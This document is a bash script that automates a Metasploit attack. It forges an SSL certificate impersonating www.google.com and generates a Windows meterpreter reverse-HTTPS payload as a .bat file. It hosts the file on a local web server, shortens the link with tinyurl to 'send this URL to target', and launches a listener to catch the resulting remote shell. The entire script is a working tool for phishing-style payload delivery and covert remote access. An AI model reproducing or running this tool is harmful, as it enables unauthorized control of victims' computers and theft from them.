#!/bin/bash
#ig: @thelinuxchoice
checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
   printf "Please, run this program as root!\n"
   exit 1
fi
}
checkroot
default_ip=$(hostname -I)
read -p "Your local ip: (Default $default_ip) " local_ip
local_ip="${local_ip:-${default_ip}}"

default_lhost=$(curl -s ifconfig.me)
read -p "Payload LHOST (Default: $default_lhost) " lhost
lhost="${lhost:-${default_lhost}}"

default_lport="443"
read -p "Payload LPORT (Default: $default_lport) " lport
lport="${lport:-${default_lport}}"

default_payload="payload"
read -p "Payload name (Default: $default_payload): " payload
payload="${payload:-${default_payload}}"

default_web='y'
read -p "Launch WebServer to send payload with URL? [Y/n]: " web 
web="${web:-${default_web}}"

pem=$(ls ~/.msf4/loot/*.pem)
if [ -e $pem ]
then
   printf '\e[0;32m Flushing .pem file...\n \e[0m'
   rm -rf ~/.msf4/loot/*.pem
fi

echo use auxiliary/gather/impersonate_ssl > meterpreter.rc
echo set RHOST www.google.com >> meterpreter.rc
echo run >> meterpreter.rc
echo exit >> meterpreter.rc

printf '\e[0;32m Creating Certificates...\n \e[0m'
msfconsole -r meterpreter.rc 1> /dev/null & 
pid=$!
wait $pid

printf '\e[0;32m Creating payload...\n \e[0m'
makepayload() {
pem=$(ls ~/.msf4/loot/*.pem)
msfvenom --smallest -p windows/meterpreter/reverse_winhttps LHOST=$local_ip LPORT=$lport PayloadUUIDTracking=true HandlerSSLCert=$pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o $payload.bat 2> /dev/null &
}
makepayload
pid=$!
wait $pid
printf '\e[0;32m Payload saves as: \e[0;31m %s\n \e[0m' "$payload.bat"
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$default_lhost:8000/$payload.bat)
fuser -k 8000/tcp &> /dev/null

if [ "$web" = 'y' ]
then
python -m SimpleHTTPServer 1> /dev/null &
pidpy=$!
printf '\e[0;32m Server launched... process ID %s\n \e[0m' "$pidpy"
printf '\e[0;32m Enable Port Forwarding in your Router, ip:\e[0;31m %s\e[0;32m ports: \e[0;31m 8000,%s\n  \e[0m' "$local_ip" "$lport"
printf '\e[0;32m To close server run as root:\e[0;31m fuser -k 8000/tcp\n \e[0m'
printf '\e[0;32m Send this URL to target:\e[0;31m %s\n \e[0m' "$send_ip"
fi
fuser -k $lport/tcp &> /dev/null
echo use exploit/multi/handler > handler.rc
echo set payload windows/meterpreter/reverse_winhttps >> handler.rc
echo set LHOST $local_ip >> handler.rc
echo set LPORT $lport >> handler.rc
echo set HandlerSSLCert $pem >> handler.rc
echo set StagerVerifySSLCert true >> handler.rc
echo run >> handler.rc
printf "\e[0;32m Launching Listener...\n \e[0m"
msfconsole -r handler.rc  


